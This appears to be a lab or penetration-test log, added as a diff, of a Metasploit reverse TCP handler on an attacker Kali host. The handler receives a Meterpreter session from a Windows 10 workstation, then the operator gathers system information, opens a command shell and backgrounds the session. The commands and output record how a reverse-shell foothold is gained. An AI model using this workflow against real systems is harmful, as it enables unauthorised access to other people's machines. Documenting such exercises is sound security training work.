@@ -1,0 +1,42 @@
+# Meterpreter Session Log – Initial Access on WS1
+# Attacker: Kali (192.168.1.5)
+# Target: WS1 (192.168.1.20)
+# Date: 2026-06-07
+
+msf6 exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 192.168.1.5:4444
+[*] Sending stage (199238 bytes) to 192.168.1.20
+[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.20:49627) at 2026-06-07 09:17:02 +0530
+
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > sysinfo
+Computer        : WS1
+OS              : Windows 10 (10.0 Build 19045)
+Architecture    : x64
+System Language : en-US
+Domain          : NATION
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+meterpreter > getuid
+Server username: NATION\normaluser
+
+meterpreter > shell
+Process 3432 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.19045.3803]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nation\normaluser
+
+C:\Windows\system32> hostname
+WS1
+
+C:\Windows\system32> exit
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(multi/handler) >
